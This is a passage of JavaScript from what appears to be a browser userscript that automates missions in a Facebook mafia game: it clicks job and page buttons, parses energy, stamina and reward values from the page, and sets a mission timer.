      ', floor=' + SpendMissionStamina.floor +
      ', Miss_Stam_Req=' + Miss_Stam_Req +
      ', burn=' + SpendMissionStamina.canBurn);
    return false;
  }
  return true;
}
////
function Do_Mission_Job(){
  //Diagnose(' mission starting Do_Mission_Job ');
  DoMafiaMissions = xpathFirst('.//a[@class="sexy_button_new do_job sexy_energy_new medium orange"  and contains(@onclick, "SocialMissionController.doTask(\''+Miss_ID+'")]', innerPageElt);
  if(DoMafiaMissions) {
  //  Diagnose(' mission orange button found (and clicking) in mission=' + Miss_ID );
    clickAction = 'Missionjob';
    suspendBank = false;
    clickElement(DoMafiaMissions);
    //Diagnose(' mission, Clicked to perform.');
    return true;
  } else {
  //Diagnose(' mission no button found');
  return false;
  }
}
////
function Chk_Nxt_MY_Mission() {
//Diagnose(' mission Chk_Nxt_MY_Mission ');
  var page_right = xpathFirst('.//a[@class="right " and contains(@onclick, "viewPage")]', innerPageElt);
  if(page_right) {
    //Diagnose(' mission found a right MY_Mission page button to Click.');
    return true;
  //} else { Diagnose(' mission did not find a right MY_Mission page button to Click.');
  }
return false;
}
////
function Chk_Nxt_Page() {
//Diagnose(' mission Chk_Nxt_Page ');
  var page_right = xpathFirst('.//a[@class="right " and contains(@onclick, "viewPage")]', innerPageElt);
  if(!page_right) {
    mmis_time = '00:10:00'; // set timer to 10 min
    //Diagnose(' mission timer holder set to: ' + mmis_time + ' no more right pages ');
    setmissiontimer();
    return false;
  //} else { Diagnose(' mission found a right page button found to Click.');
  }
return true;
}
////
function Go_Nxt_Page() {
  //Diagnose(' mission Go_Nxt_Page ');
  var page_right = xpathFirst('.//a[@class="right " and contains(@onclick, "viewPage")]', innerPageElt);
  if(page_right){
    //Diagnose(' mission Clicking right page button.');
    clickElement(page_right);
    Autoplay.delay = getAutoPlayDelay();
    return true;
  //} else { Diagnose(' mission found no right page button.');
  }
return false;
}
////
function Chk_Left_Page() {
  var page_left = xpathFirst('.//a[@class="left " and contains(@onclick, "viewPage")]', innerPageElt);
  if(page_left){
  //  Diagnose(' mission page LEFT button found and clicking.');
    clickElement(page_left);
    return true;
  } else  {
    //  Diagnose(' mission page LEFT button not found.');
    return false;
  }
}
////
function Check_Mission_Job(){
 //Diagnose(' mission starting Check_Mission_Job ');
  // if we find this link, we are in a non finished job
  MyMafiaJobs = xpathFirst('.//a[@class="sexy_button_new do_job sexy_energy_new medium orange"  and contains(@onclick, "SocialMissionController.doTask(\''+Miss_ID+'")]', innerPageElt);
  if(MyMafiaJobs) { return true; }
//  if(!MyMafiaJobs) {
    MyMafiaJobs = xpathFirst('.//a[@class="sexy_button_new do_job medium white" and contains(@onclick, "SocialMissionView.startTask" ) ]', innerPageElt);
    if(MyMafiaJobs) {  // if we have a mission to try to do, see if we can
      Load_MMiss_Info();
      if(MyMafiaJobs) {
        clickElement(MyMafiaJobs); // click white start job button
        return true ;
      }
    }
  // }
  return false;
}
////
function Load_MMiss_Info(){
  MyMafiaJobs = xpathFirst('.//a[@class="sexy_button_new do_job medium white" and contains(@onclick, "SocialMissionView.startTask" ) ]', innerPageElt);

  if(MyMafiaJobs) {
    Miss_ID     = MyMafiaJobs.getAttribute('onclick').split('SocialMissionView.startTask(\'')[1].split('\',\'')[0]  ;  // will pull out just the 1 id
    Miss_Slot   = MyMafiaJobs.getAttribute('onclick').split('SocialMissionView.startTask(\''+Miss_ID+'\',\'')[1].split('\',\'')[0]  ;
    MIss_chk_ID = MyMafiaJobs.getAttribute('onclick').split('SocialMissionView.startTask(\''+Miss_ID+'\',\''+Miss_Slot+'\',\'')[1].split('\'')[0] ;
    Diagnose(' mission Miss_ID='+Miss_ID+'-Miss_Slot='+Miss_Slot+'-MIss_chk_ID=' + MIss_chk_ID + '=');
    Miss_Name = xpathFirst('.//div[contains(@id,"socialMission_'+Miss_ID+'")]//div[@class="missionName"]', innerPageElt);
    if(Miss_Name) {
      Miss_Name_is = Miss_Name.innerHTML.untag();
      Diagnose(' mission Miss_Name: '+Miss_Name_is+'=');
    } else { Diagnose(' mission new code to find miss name FAILED');
    }
    Chk_Miss_Pay_Exp = xpathFirst('.//div[ contains (@id,"missionTask_'+Miss_Slot+'_'+Miss_ID+'_module")]//dd[ contains (@class,"experience")]', innerPageElt);  //shows total mastery result
      if(Chk_Miss_Pay_Exp){
        Miss_Pay_Exp = Chk_Miss_Pay_Exp.innerHTML.untag();
        //Diagnose(' mission experience Returned: '+Miss_Pay_Exp);
      }
    Chk_Miss_Pay_Cash = xpathFirst('.//div[ contains (@id,"missionTask_'+Miss_Slot+'_'+Miss_ID+'_module")]//dd[ contains (@class,"cash")]', innerPageElt);  //shows total mastery result
      if(Chk_Miss_Pay_Cash){
        Miss_Pay_Cash = Chk_Miss_Pay_Cash.innerHTML.untag();
        //Diagnose(' mission Cash Returned: '+Miss_Pay_Cash);
      }
    Miss_Nrg_Req = 0 ;
    Miss_Stam_Req = 0 ;
    Chk_Miss_Nrg = xpathFirst('.//div[ contains (@id,"missionTask_'+Miss_Slot+'_'+Miss_ID+'_module")]//dd[ contains (@class,"energy")]', innerPageElt);  //shows total mastery result
      if(Chk_Miss_Nrg){
        Miss_Nrg_Req = Chk_Miss_Nrg.innerHTML.untag();
        Miss_Ratio =  Math.round(Miss_Pay_Exp / Miss_Nrg_Req * 100 ) / 100 ;
        Diagnose(' mission Energy Required: '+Miss_Nrg_Req+' with ratio of: '+ Miss_Ratio);
      //} else { Miss_Nrg_Req = 0 ;
      }
    Chk_Miss_Stam = xpathFirst('.//div[ contains (@id,"missionTask_'+Miss_Slot+'_'+Miss_ID+'_module")]//dd[ contains (@class,"stamina")]', innerPageElt);  //shows total mastery result
      if(Chk_Miss_Stam){
        Miss_Stam_Req = Chk_Miss_Stam.innerHTML.untag();
        Miss_Ratio =  Math.round(Miss_Pay_Exp / Miss_Stam_Req * 100 ) / 100 ;
        Diagnose(' mission Stamina Required: '+Miss_Stam_Req+' with ratio of: '+ Miss_Ratio);
      //} else { Miss_Stam_Req = 0 ;
      }

    if((!chk_stam()) || (!chk_nrg()) ) {
      MyMafiaJobs = null;
      return false;
    }
    if(MyMafiaJobs) { return true ;
    }
  }
}
////
function setmissiontimer() {
  if(isGMChecked('TestChanges')) {
    mmis_time = '00:00:45'; // if testing, set timer to 45 seconds
  } else {
    mmis_time = '00:10:00'; // set timer to 10 min
  }
  Diagnose(' mission timer set to: ' + mmis_time );
  setGMTime('colmissionTimer', mmis_time);
}
///////////////////////////////////////////////////////// end of miss collect
function MMMiss_ver(){
  tst_ver = null;
//  if (isGMChecked('TestChanges')) { tst_ver = 'A';  }
}
